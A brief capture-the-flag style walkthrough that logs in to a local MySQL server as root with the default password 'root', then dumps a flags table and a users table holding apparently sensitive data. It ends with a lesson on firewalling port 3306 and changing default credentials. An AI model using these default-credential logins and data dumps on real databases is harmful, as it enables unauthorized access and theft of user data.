Step 1: Connect to MySQL:
  mysql -h 127.0.0.1 -u root -proot

Step 2: List databases:
  mysql> SHOW DATABASES;

Step 3: Use the database:
  mysql> USE innovatetech;

Step 4: List tables:
  mysql> SHOW TABLES;

Step 5: Get the flag:
  mysql> SELECT * FROM flags;

Step 6: Also check for sensitive data:
  mysql> SELECT * FROM users;

Real-world lesson: MySQL port 3306 must NEVER be internet-facing. Use firewall rules, VPNs, or SSH tunneling. Always change default credentials. The root user should have a strong password and be restricted to localhost.
